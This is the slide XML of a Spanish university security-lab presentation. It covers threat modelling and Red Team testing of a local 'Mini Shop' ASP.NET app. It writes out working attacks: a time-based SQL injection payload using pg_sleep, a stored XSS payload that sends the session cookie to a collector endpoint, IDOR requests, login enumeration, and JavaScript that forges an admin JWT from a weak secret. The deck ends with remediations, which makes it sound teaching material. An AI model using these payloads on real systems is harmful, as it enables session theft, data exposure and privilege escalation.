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· SEGURIDAD DE SOFTWARE ISW · LABORATORIO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🛡️  UNAPEC Mini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843"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Security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Modelo de Amenazas · Análisis de Seguridad · Fase 1 (Red Team)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846320"/>
            <a:ext cx="67052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·   Jose Canelo   ·   Rainiery Peña</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr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·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81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Arquitectura de la Aplicación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556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Stack tecnológico, roles y despliegue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94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46887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Entidades, flujos y límites de confianza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89504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8094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0779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821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10 amenazas identificadas y clasificadas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02736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941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62102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Demostración de Vulnerabilidades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89534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5 ataques ejecutados con evidencia detallada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15968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40740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3342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Evidencia DevTools / Burp Suite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6085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Peticiones HTTP, headers, respuestas capturadas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2920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474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Puntuaciones CVSS v3.1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3218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Evaluación de severidad por hallazgo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742431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1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7607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6035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Remediaciones para Fase 2 (Blue Team)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Arquitectura de la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Stack tecnológico y configuración del laboratorio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⚙️  Servidor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ASP.NET Core 10 (Kestrel) — MVC/Razor + API Controllers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🗄️  Base de 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PostgreSQL 18 Alpine — 7 tablas, datos sintéticos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🐳  Contenedor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Docker Compose — bind 127.0.0.1:5081, read-only, non-root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🔐  Auth MVC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Cookie LabSession — HttpOnly=false en Red Team (intencionalmente)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🎫  Auth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JWT Bearer HS256 — secreto débil 'MiniShopLab2026' (15 bytes)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👥 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Cliente (4 cuentas) · Vendedor (1) · Admin (1)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="20" name="Picture 19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29832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0" y="4572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Catálogo de productos — Vista pública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1 — Entidades, flujos de datos y límites de confianza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2C7BE5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Usuario</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>(Cliente/Vendedor/Admin)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828800"/>
            <a:ext cx="2560320" cy="91440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94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ASP.NET Core</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>MVC/Razor +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28800"/>
            <a:ext cx="2286000" cy="91440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8745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🗄️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PostgreSQL</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>(Datos sintéticos)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2011680" cy="9144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Burp / ZAP</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Herramientas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840480"/>
            <a:ext cx="2286000" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6C757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206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Logs</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>(stdout contenedor)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645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→ HTTP, cookies,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← HTML/JSON, cookie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645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3366"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>→ EF Core/Npgsql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→ SQL raw (Red Team)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→ Logs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E44AD"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>→ HTTP loopback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029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3366"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>─ ─ ─  Trust Boundaries  ─ ─ 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TB-1: Navegador →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Entrada no confiable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TB-2: Herramientas → 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loopback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TB-3: App → PostgreSQL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Límite proceso/datos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TB-4: /lab/collect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Flujo XSS cookie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TB-5: Contenedor → Host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127.0.0.1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C0392B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>↗ Cookie robada → /lab/collect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10 amenazas identificadas — todas las categorías cubiertas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08760"/>
            <a:ext cx="54864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Spoofing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Suplantación de identidad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S-01: Enumeración de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S-02: JWT débil → forjar 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1508760"/>
            <a:ext cx="54864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Tampering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Alteración de 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T-01: SQLi blind en búsqueda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T-02: IDOR escritura en carrito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20" y="1508760"/>
            <a:ext cx="54864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Repudiation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Repudio de acciones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R-01: Sin tabla de auditoría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069080"/>
            <a:ext cx="548640" cy="5486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Info Disclosure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Divulgación de información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I-01: XSS + robo de cookie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I-02: BOLA lectura de datos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406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I-03: Enumeración login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34840" y="4069080"/>
            <a:ext cx="54864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Denial of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Denegación de servicio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D-01: Sin rate limit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4069080"/>
            <a:ext cx="54864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Elev. of Privilege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Elevación de privilegios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E-01: Cookie/JWT → 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1: SQL Injection Blind Time-Based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VULN-01 · CWE-89 ·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9436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GET /api/products/search?q=&lt;payload&gt;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Enviar búsqueda normal → medir tiempo base (~0.005s)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2. Inyectar: q=no-match' OR (SELECT 1 FROM pg_sleep(2))=1 --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3. Medir tiempo de respuesta (~2.007s = +2.0s de retardo)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4. Confirmar con sqlmap: extraer nombre BD y tablas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📊 Resultados (DevTools Network)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Baseline:  4ms  →  Con pg_sleep(2):  2007ms</a:t>
            </a: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Diferencia: ~2003ms de retardo (inyección confirmada)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🛠️ Herramientas: DevTools Network + sqlmap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SQL raw con concatenación directa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del parámetro q usando rol minishop_search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71600"/>
            <a:ext cx="4846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417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200400"/>
            <a:ext cx="4846320" cy="27260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0" y="5029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Página de búsqueda — punto de inyección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Evidencia SQLi: DevTools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Comparación de tiempos — búsqueda normal vs inyección pg_sleep(2)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⚠ PLACEHOLDER — Reemplazar con Burp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Petición Normal (baseline)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486400" cy="2194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1208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GET /api/products/search?q=teclado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HTTP/1.1 200 OK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Content-Type: application/json; charset=utf-8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Server: Kestrel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Status:    200 OK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Duration:  4ms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Type:      fetch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MimeType:  application/json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Petición Inyectada (pg_sleep(2))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486400" cy="2194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37360"/>
            <a:ext cx="521208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GET /api/products/search?q=no-match'+OR+(SELECT+1+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FROM+pg_sleep(2))%3D1+--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HTTP/1.1 200 OK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Content-Type: application/json; charset=utf-8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Server: Kestrel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Status:    200 OK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Duration:  2007ms  ← +2003ms de retardo!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Type:      fetch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11247120" cy="118872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📊 Análisis de Tiempos (equivalente a Burp Suite Repeater/Intruder)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Normal:    GET /api/products/search?q=teclado                    → 4ms     (HTTP 200)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Inyectada: GET /api/products/search?q=no-match'+OR+pg_sleep(2)   → 2007ms  (HTTP 200)</a:t>
            </a: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Δ Tiempo = 2003ms ≈ pg_sleep(2) — INYECCIÓN SQL CONFIRMADA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600"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>⚠ Nota: Estas capturas DevTools serán reemplazadas por capturas de Burp Suite Repeater en la entrega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2: XSS Almacenado + Robo de Cookie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VULN-02 · CWE-79 ·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POST /api/products/{id}/comments  +  GET /Products/Details/{id}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Cadena de ataque completa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Atacante (cliente-a) publica comentario malicioso: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&lt;img src=x onerror="fetch('/lab/collect?c='+...)"&gt;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El comentario se almacena sin sanitización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(@Html.Raw renderiza HTML crudo en modo Red Team)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Víctima (cliente-xss) visita /Products/Details/1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→ El JS inyectado ejecuta automáticamente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Cookie LabSession enviada a /lab/collect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GET /lab/collect?c=LabSession%3DCfDJ8... (HTTP 204)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5: Atacante replica cookie → suplanta sesión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GET /Account/Profile con cookie robada → ve 'cliente-xss'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@Html.Raw sin encoding + cookie sin HttpOnly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UI:R</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>S:C / C:H / I:N / A:N</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Picture 14" descr="05-product-detail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Detalle de producto con comentario XSS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Evidencia XSS: Cookie Theft via DevTools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Petición /lab/collect capturada — cookie LabSession exfiltrada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⚠ PLACEHOLDER — Reemplazar con Burp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Cookies del navegador (víctima cliente-xss) — HttpOnly=false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11247120" cy="10058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document.cookie = 'LabSession=CfDJ8Ae0AZXF1ABKv...zgHA'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Cookie accesible desde JavaScript (HttpOnly=false)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El script XSS la lee y la envía a /lab/collect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Petición de exfiltración capturada en Network (equiv. Burp HTTP History)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548640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521208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# Request #7 — Cookie Theft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GET /lab/collect?c=LabSession%3DCfDJ8Ae0AZXF1A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BKvkpotqqq1LhpAGa4vTu-...[REDACTED]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Referer: http://127.0.0.1:5081/Products/Details/1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User-Agent: Mozilla/5.0 (X11; Linux x86_64)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sec-ch-ua-platform: "Linux"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HTTP/1.1 204 No Content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Server: Kestrel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Date: Mon, 26 Oct 2026 01:43:54 GMT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200400"/>
            <a:ext cx="548640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291840"/>
            <a:ext cx="521208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# Análisis de la petición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Método:    GET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Endpoint:  /lab/collect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Param c:   LabSession=CfDJ8...[cookie completa]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Origen:    Referer: /Products/Details/1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Status:    204 No Content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Duration:  39ms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Type:      fetch (desde img onerror JS)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Cookie de sesión exfiltrada exitosamente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600"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>⚠ Nota: Estas capturas DevTools serán reemplazadas por capturas de Burp Suite HTTP History en la entrega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3: IDOR / BOLA — Acceso No Autorizado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VULN-03 · CWE-639 · OWASP A01:2021 Broken Access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Endpoints afectados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/api/cart/{cartId}  ·  /api/orders/{orderId}  ·  /api/admin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Login como cliente-a (userId=1)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BOLA Lectura — GET /api/cart/2 (carrito de B)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200: {userId:2, items:[Ratón demo, qty:5]}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IDOR Escritura — PUT /api/cart/2/items/2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Modifica cantidad del carrito de cliente-b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Lectura pedido — GET /api/orders/2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Datos completos del pedido de cliente-b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5: Bypass admin — GET /api/admin (con cookie MVC)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Cliente accede a panel admin sin rol Admin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Sin validación de ownership por recurso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UI:N</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>S:U / C:H / I:H / A:N</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Picture 14" descr="06-cart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Carrito — punto de acceso IDOR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Evidencia IDOR: DevTools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Cliente-a accede a recursos de Cliente-b sin autorización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⚠ PLACEHOLDER — Reemplazar con Burp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Carrito propio (userId=1)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486400" cy="1737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GET /api/cart/1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Cookie: LabSession=CfDJ8...[cliente-a]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HTTP/1.1 200 OK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Content-Type: application/json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→ {userId:1, items:[...]} — Acceso legítimo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Carrito ajeno (userId=2) ← IDOR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486400" cy="1737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3736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GET /api/cart/2 HTTP/1.1  ← ID de otro usuario!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Cookie: LabSession=CfDJ8...[cliente-a]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HTTP/1.1 200 OK  ← Debería ser 403!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Content-Type: application/json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{userId:2, items:[Ratón demo,qty:5]}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Pedido ajeno — GET /api/orders/2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548640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11480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GET /api/orders/2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Cookie: LabSession=CfDJ8...[cliente-a]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HTTP/1.1 200 OK  ← Sin validación ownership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{id:2, userId:2, total:149.95...}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657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Admin bypass — GET /api/admin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023360"/>
            <a:ext cx="548640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11480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GET /api/admin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Cookie: LabSession=CfDJ8...[cliente-a]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HTTP/1.1 200 OK  ← Cliente no es Admin!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{users:[6], products:[4], orders:[2]}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77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600"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>⚠ Nota: Estas capturas DevTools serán reemplazadas por capturas de Burp Suite en la entrega final.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4: Autenticación Débil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VULN-04 · CWE-204/307 · OWASP A07:2021 Auth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POST /api/auth/login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Hallazgo A: Enumeración de usuarios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inexistente → "Usuario inexistente." (HTTP 401)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existente, pass mal → "Contraseña incorrecta." (401)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Mensajes DIFERENTES revelan qué cuentas existen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Hallazgo B: Timing Side-Channel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inexistente: respuesta en ~5ms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existente, pass mal: respuesta en ~72ms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Diferencia de timing confirma existencia de cuenta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Hallazgo C: Sin Rate Limiting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7 intentos consecutivos, ningún HTTP 429 ni bloqueo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Fuerza bruta viable sin restricciones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Mensajes diferenciados + sin rate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2-log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Página de login — punto de enumeración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Evidencia Auth: Enumeración + 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POST /api/auth/login — mensajes diferenciados y side-channel de timing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⚠ PLACEHOLDER — Reemplazar con Burp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Usuario inexistente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486400" cy="2011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POST /api/auth/login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Content-Type: application/json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Body: {"username":"noexiste","password":"x"}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HTTP/1.1 401 Unauthorized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Body: {"message":"Usuario inexistente."}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Duration: 5ms  ← RÁPIDO (no busca password)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Usuario existente, contraseña incorrecta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486400" cy="2011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3736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POST /api/auth/login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Content-Type: application/json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Body: {"username":"admin","password":"wrong"}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HTTP/1.1 401 Unauthorized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Body: {"message":"Contraseña incorrecta."}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Duration: 72ms  ← LENTO (verifica hash)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31920"/>
            <a:ext cx="11247120" cy="18288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📊 Análisis (equiv. Burp Suite Intruder — Timing Attack)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Intento 1: 'noexiste'    → 401 'Usuario inexistente.'     → 5ms     ← usuario no existe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Intento 2: 'admin'       → 401 'Contraseña incorrecta.'   → 72ms    ← usuario EXISTE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Intento 3: 'cliente-a'   → 401 'Contraseña incorrecta.'   → 68ms    ← usuario EXISTE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→ Doble canal de enumeración: mensaje diferenciado + timing side-channel (5ms vs 72ms)</a:t>
            </a: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→ 7 intentos consecutivos sin HTTP 429 ni lockout = fuerza bruta viable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600"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>⚠ Nota: Estas capturas DevTools serán reemplazadas por capturas de Burp Suite Intruder en la entrega final.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5: JWT HS256 Weak Secret — Escalación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VULN-05 · CWE-347/269 · OWASP A02:2021 Cryptographic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/api/admin (Bearer JWT con role=Admin requerido)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Login como cliente-a → obtener JWT legítimo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→ Payload: {sub:'1', unique_name:'cliente-a', role:'Cliente'}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GET /api/admin con token original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403 Forbidden (role=Cliente, necesita Admin)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Forjar token con PyJWT / Web Crypto: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secret = b'MiniShopLab2026'.ljust(32, b'\x00')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payload = {..., role: 'Admin'}  # cambiar rol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jwt.encode(payload, secret, algorithm='HS256')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GET /api/admin con token forjado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HTTP 200 OK — acceso total a datos administrativos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6 usuarios, 4 productos, 2 pedidos expuestos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Secreto HS256 de 15 bytes (débil + adivinable)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UI:N</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>S:C / C:H / I:H / A:N</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Picture 14" descr="08-adm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Panel Admin — destino de la escalación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Evidencia JWT: Token Forjado via DevTools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Web Crypto API — forja de JWT HS256 con role=Admin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⚠ PLACEHOLDER — Reemplazar con Burp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Paso 1: Forjar token con Web Crypto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48640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1208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// JavaScript ejecutado en DevTools Console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const secret = 'MiniShopLab2026';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const keyBytes = new Uint8Array(32);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keyBytes.set(new TextEncoder().encode(secret));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// Zero-padded to 32 bytes (como hace el server)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const payload = {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sub: '999',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  unique_name: 'hacker',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role: 'Admin',  // ← ESCALACIÓN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iss: 'MiniShopLab',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aud: 'MiniShopLab'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Paso 2: GET /api/admin con token forjado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48640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37360"/>
            <a:ext cx="521208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# Request #9 — Forged JWT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GET /api/admin HTTP/1.1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Authorization: Bearer eyJhbGciOiJIUzI1NiI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sInR5cCI6IkpXVCJ9.eyJzdWIiOiI5OTkiLC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J1bmlxdWVfbmFtZSI6ImhhY2...[FORGED]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Host: 127.0.0.1:5081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HTTP/1.1 200 OK  ← ACCESO ADMIN CONCEDIDO!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Content-Type: application/json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Server: Kestrel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Duration: 39ms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{users:[6 cuentas], products:[4], orders:[2]}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72000"/>
            <a:ext cx="11247120" cy="118872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📊 Comparación (equiv. Burp Suite Repeater — token manipulation)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Con cookie (cliente-xss, role=Cliente):  GET /api/admin → 200 OK (BOLA via cookie)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Con JWT forjado (role=Admin, sub=999):   GET /api/admin → 200 OK (Admin completo)</a:t>
            </a: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→ Token forjado con secreto débil acepta role=Admin para usuario ficticio 'hacker'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600"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>⚠ Nota: Estas capturas DevTools serán reemplazadas por capturas de Burp Suite Repeater en la entrega final.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Resumen de Puntuaciones CVSS v3.1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Evaluación de severidad de los 5 hallazgos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100584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54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JWT HS256 Weak Secret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1737360"/>
            <a:ext cx="43891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42316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14600"/>
            <a:ext cx="100584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03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514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834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IDOR/BOLA Carrito/Pedidos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9748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2697480"/>
            <a:ext cx="3703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338328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47472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XSS Almacenado + Cookie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65760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3657600"/>
            <a:ext cx="3108959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34340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43484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434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SQLi Blind Time-Based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461772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0" y="461772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7200" y="530352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39496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3949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6072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Auth Débil (Enum + Brute)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0" y="557784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0" y="557784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7200" y="6309360"/>
            <a:ext cx="274320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CRITICAL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4720" y="6309360"/>
            <a:ext cx="274320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HIGH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92240" y="6309360"/>
            <a:ext cx="2743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 MEDIUM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 de la Aplicación — UNAPEC Mini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Capturas de las principales pantallas del sistema</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6" descr="03-catalog-logg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29832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Catálogo autenticado</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8" descr="04-profile-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832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Perfil de usuario</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10" descr="08-admin-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31920"/>
            <a:ext cx="5303520" cy="29832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 administración</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="Picture 12" descr="09-seller-n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303520" cy="29832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del vendedor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2: Blue Team — Remediaciones propuestas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✅ Fase 1 Completada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10 amenazas STRIDE identificadas y validadas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5 vulnerabilidades demostradas con evidencia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DFD validado contra la aplicación real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CVSS v3.1 calculado para cada hallazgo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Evidencia DevTools como base para Burp Suite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📊 Distribución de severidad:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="C0392B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>1 vulnerabilidad CRITICAL (CVSS 9.6)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="E67E22"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>1 vulnerabilidad HIGH (CVSS 8.1)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="F39C12"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>3 vulnerabilidades MEDIUM (CVSS 5.3-6.8)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53035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🔧 Plan de Remediación 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Migrar JWT a RS256 con par de llaves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forja de tokens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Validar ownership en carrito/pedidos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IDOR/BOLA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Sanitizar comentarios + CSP + HttpOnly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XSS almacenado y robo de cookie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Parametrizar consultas SQL (EF Core)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SQLi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Rate limiting con Redis + lockout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Mitiga fuerza bruta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Mensaje uniforme en login + bcrypt + TOTP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enumeración, fortalece autenticación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Tabla de auditoría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Trazabilidad de acciones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· SEGURIDAD DE SOFTWARE ISW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¡Gracias!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843"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>🛡️ UNAPEC Mini Shop Security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840480"/>
            <a:ext cx="48764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·   Jose Canelo   ·   Rainiery Peña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· Fase 1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Octubre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